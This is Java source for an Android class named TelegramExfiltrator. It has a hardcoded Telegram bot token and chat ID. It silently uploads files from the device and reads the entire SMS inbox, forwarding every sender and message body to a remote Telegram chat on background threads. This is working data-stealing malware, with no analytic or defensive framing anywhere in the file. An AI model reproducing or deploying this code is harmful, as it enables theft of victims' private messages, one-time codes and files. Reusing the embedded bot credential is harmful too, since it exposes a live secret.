package com.example.exfiltrator;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class TelegramExfiltrator {
    private static final String BOT_TOKEN = "9085718260:AAFr_QfMHH1hgDrfZGpZbII9cgTqaC-mpVs";
    private static final String CHAT_ID = "8859920681";

    public static void sendFileToTelegram(File file) {
        if (file == null || !file.exists()) return;
        new Thread(() -> {
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument?chat_id=" + CHAT_ID;
            try {
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                String boundary = "*****" + System.currentTimeMillis() + "*****";
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                OutputStream outputStream = conn.getOutputStream();
                outputStream.write(("--" + boundary + "\r\n").getBytes());
                outputStream.write(("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"\r\n\r\n").getBytes());

                FileInputStream fileInputStream = new FileInputStream(file);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                    outputStream.write(buffer, 0, bytesRead);
                }
                fileInputStream.close();
                outputStream.write(("\r\n--" + boundary + "--\r\n").getBytes());
                outputStream.flush();
                outputStream.close();

                conn.getResponseCode();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    public static void sendTextToTelegram(String message) {
        new Thread(() -> {
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
            try {
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                String data = "chat_id=" + CHAT_ID + "&text=" + java.net.URLEncoder.encode(message, "UTF-8");
                OutputStream os = conn.getOutputStream();
                os.write(data.getBytes());
                os.flush();
                os.close();

                conn.getResponseCode();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    public static void readSmsAndSend(Context context) {
        Uri uriSms = Uri.parse("content://sms/inbox");
        Cursor cursor = context.getContentResolver().query(uriSms, new String[]{"address", "body"}, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String address = cursor.getString(0);
                String body = cursor.getString(1);
                sendTextToTelegram("SMS From: " + address + "\nMessage: " + body);
            }
            cursor.close();
        }
    }
}
